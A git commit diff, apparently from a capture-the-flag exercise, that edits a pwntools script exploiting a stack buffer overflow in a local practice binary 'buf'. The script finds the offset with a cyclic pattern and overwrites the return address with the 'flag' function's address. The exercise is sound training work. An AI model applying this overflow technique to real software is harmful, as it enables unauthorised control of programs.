84836de45dc17ec6d61f7e4f103d9e754720395e
Jarrod Pas <jarrod@jarrodpas.com>
2019-02-11 10:27:27 +0900

    Fixes own script to use tmux

--- buf/own.py
+++ buf/own.py
@@ -1,20 +1,21 @@
+#!/usr/bin/env python2
 from __future__ import print_function
 
-from pwn import *
+import sys
 
-crash = True
-if crash:
+from pwn import *
+context.terminal = ['tmux', 'splitw', '-v']
+
+if len(sys.argv) > 1:
     p = gdb.debug('./buf')
     pause()
     p.sendline(cyclic(512))
     pause()
-    # run in gdb: x/1x
+    # run in gdb: x/1x $sp to get value in sp
     sys.exit()
 
 elf = ELF('./buf')
-
 exploit = cyclic(cyclic_find(0x61616167))
-
 exploit += p64(elf.symbols[u'flag'])
 
 p = process('./buf')
